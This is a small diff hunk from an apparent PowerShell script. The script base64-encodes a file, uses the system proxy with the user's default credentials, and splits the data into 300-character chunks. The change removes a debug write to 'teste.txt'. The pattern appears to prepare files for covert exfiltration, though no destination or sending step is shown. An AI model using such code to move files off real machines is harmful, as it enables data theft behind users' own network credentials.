@@ -6,8 +6,6 @@ $finalData =[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
 $proxy = [System.Net.WebRequest]::GetSystemWebproxy()
 $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
 
-echo $finalData > teste.txt
-
 
 $finalData = $finalData -split '(\S{300})' | ? {$_}
 $split_count = ([regex]::Matches($finalData, "(\S{300})" )).count
